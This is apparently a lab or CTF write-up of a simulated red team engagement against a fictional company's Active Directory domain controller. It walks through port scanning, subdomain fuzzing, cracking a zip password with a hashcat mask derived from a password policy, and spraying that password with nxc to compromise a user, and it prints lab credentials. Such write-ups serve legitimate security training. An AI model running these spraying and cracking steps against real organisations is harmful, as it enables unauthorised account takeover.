# Objective and scope
You have been hired to perform a red team engagement against Trask Industries. Trask is a forward-thinking technology firm, with a heavy focus on research and development (R&D).

Trask Industries is not aware of the engagement; instead, you have been hired as a new employee in the R&D department. Your task is to begin as a "new employee" and demonstrate impact by elevating your privileges to Domain Admin (if possible).

I have also been provided a onboarding document that i will use for initial access

Also given a wordlist for any hashcracking

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.0.0.5 -vv

Completed Connect Scan at 16:17, 459.70s elapsed (65535 total ports)
Nmap scan report for dc01 (10.0.0.5)
Host is up, received user-set (0.092s latency).
Scanned at 2026-09-27 16:09:38 BST for 460s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
45985/tcp open  unknown          syn-ack
49664/tcp open  unknown          syn-ack
52200/tcp open  unknown          syn-ack
52207/tcp open  unknown          syn-ack
52224/tcp open  unknown          syn-ack
52234/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 459.73 seconds
```

## NMap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -A --min-rate=200 -sT -Pn dc01.trask.hsm 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-27 16:18 +0100
Nmap scan report for dc01.trask.hsm (10.0.0.5)
Host is up (0.093s latency).
rDNS record for 10.0.0.5: dc01

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-27 15:18:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trask.hsm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trask.hsm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



![](Pasted%20image%2020260927160217.png)

I have been given a username and a password, which i will use

```python
k.pryde:KP_TempPass_1988!
```

These credentials dont work as domain credentials

# HTTP (80)

![](Pasted%20image%2020260927162524.png)

A lot of this site is static

There is a request i can make through the `partner with us` option

There is a subdomain `www` but its the same page

## Subdomains
```python
ffuf -u http://trask.hsm/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.trask.hsm' -ic -c -t 20 -mc 301,302          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trask.hsm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.trask.hsm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 301,302
________________________________________________

onboarding              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 99ms]
```

# `onboarding` subdomain 

![](Pasted%20image%2020260927172155.png)

`k.pryde` credentials log me in 

![](Pasted%20image%2020260927172505.png)

Found some users, using the format i know exists, i can validate these users

![](Pasted%20image%2020260927172922.png)

There is a password policy

There is also an option to download a zip file

The files are password protected

Ive generated a hash using zip2john but it wont crack with the provided wordlist or rockyou

# Cracking `.zip` file hash

Ill use the password policy to try and get the password for the file

```python
zip2john onboarding-documents.zip > zip.hash
```

Ill generate the hash

```python
hashcat -m 17225 -a 3 zip.hash 'ProtoTr?1?1?1?11973!' -1 ?l?d?u --user

$pkzip$8*1*1*0*8*24*f2d7*7b7442ad6d177d4bf47ca8182d3f9aa082824035aaa837db0129ee3636fcfb75bf6f2045*1*0*8*24*647d*6db32ca529faa1fa3f92b89c39699e5099e4a42baec64b8bf066f91ceb1ce16bfb8a2f8e*1*0*8*24*fd17*12a4b60107b9f8956e30705ed16fdd73e010d3b7e03e3d10dc137ae9836aa522c9ac67fd*1*0*8*24*d982*4666df7288e3d762d9a2ff1bc7227f93b150b902a80ea1e1f64980ae83e02b71e1b536ab*1*0*8*24*5cbe*d66452516e7060a2e18dfecbb699a95d1d4bd979f17a27bc820ed7d8fe4cbaffbfe4017a*1*0*8*24*6007*89cfaa97274ae290af2646e177a5fd6aa61f8183494cb8ac6fbc30672d2ace504b286dc3*1*0*8*24*157c*69b008168a6a667f32f1efa16b8affef00ce8e3b14ac05f50b856c414bfc439ab11458fd*2*0*107*19f*56099dcf*2160*3e*8*107*5609*1b2815b30df31c53c08bf1a3d14087b1d53366e4ea6709dff70b069df25c511bb1cd04440a7aa89cc036bb8db749b21a64599e7a11cb592263e4a897c0adb461ac734228a41d8ef23b90ed133853d4dac94a60cca6b6c6cabaf03af8cee9fbdc8e83221262da9ccf60a5cd9a76466413bd4f2fd6c9428a6e49cba79f70b49234e5203a3f187a37c3dc9535d75cee79cc1934b02b38367c0a6d557fc8144fc9b6bed3212f97f236ae2a7b9dcdd579260ed2842b3e133d0450985db40de15039b8ab057216e625e369cdd5a186a8ed8fad30fdff9c29f407761ccc7821311dc7a5ef924ef52ffe282bcf4e70f36a9b4ed91b3ca5f90e75c2d0031cca7585937e4300d00d0f975b2d*$/pkzip$:ProtoTra1NR1973!
```

I have cracked the hash

Ill specify the mode for zip files, and `-a 3` for bruteforce mode, then the hash file with the format.

`-1 ?l?d` = defines custom charset 1 as lowercase letters + digits (adjust to `?u?l?d` if uppercase is also possible mid-string)

There is nothing too interesting in these files, but this password used to unzip might be used as a domain credential

# User compromise via password spray

```python
j.bewick
b.trask
d.dunsire
k.curgenven
l.mitchell
k.ryan
e.parsons
```

Earlier i found a orientation schedule with some users

I can try and spray the password on one of these users

```python
nxc smb dc01.trask.hsm -u users.txt -p 'ProtoTra1NR1973!' -k --continue-on-success

SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973!
```

`k.ryan` is compromised

# Domain enumeration

```python
nxc smb dc01.trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --pass-pol     
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973! 
SMB         dc01.trask.hsm  445    dc01             [+] Dumping password info for domain: TRASK
SMB         dc01.trask.hsm  445    dc01             Minimum password length: 7
SMB         dc01.trask.hsm  445    dc01             Password history length: 24
SMB         dc01.trask.hsm  445    dc01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         dc01.trask.hsm  445    dc01             
SMB         dc01.trask.hsm  445    dc01             Password Complexity Flags: 000001
SMB         dc01.trask.hsm  445    dc01                 Domain Refuse Password Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Store Cleartext: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Lockout Admins: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password No Clear Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password No Anon Change: 0
SMB         dc01.trask.hsm  445    dc01                 Domain Password Complex: 1
SMB         dc01.trask.hsm  445    dc01             
SMB         dc01.trask.hsm  445    dc01             Minimum password age: 1 day 4 minutes 
SMB         dc01.trask.hsm  445    dc01             Reset Account Lockout Counter: 10 minutes 
SMB         dc01.trask.hsm  445    dc01             Locked Account Duration: 10 minutes 
SMB         dc01.trask.hsm  445    dc01             Account Lockout Threshold: None
SMB         dc01.trask.hsm  445    dc01             Forced Log off Time: Not Set
```

No lockout policy

## Shares
```python
nxc smb dc01.trask.hsm -u k.ryan -p 'ProtoTra1NR1973!' -k --shares  
SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\k.ryan:ProtoTra1NR1973! 
SMB         dc01.trask.hsm  445    dc01             [*] Enumerated shares
SMB         dc01.trask.hsm  445    dc01             Share           Permissions     Remark
SMB         dc01.trask.hsm  445    dc01             -----           -----------     ------
SMB         dc01.trask.hsm  445    dc01             ADMIN$                          Remote Admin
SMB         dc01.trask.hsm  445    dc01             C$                              Default share
SMB         dc01.trask.hsm  445    dc01             IPC$            READ            Remote IPC
SMB         dc01.trask.hsm  445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.trask.hsm  445    dc01             New_Employee_Onboarding READ            
SMB         dc01.trask.hsm  445    dc01             SYSVOL          READ            Logon server share
```

## Users
```python

```

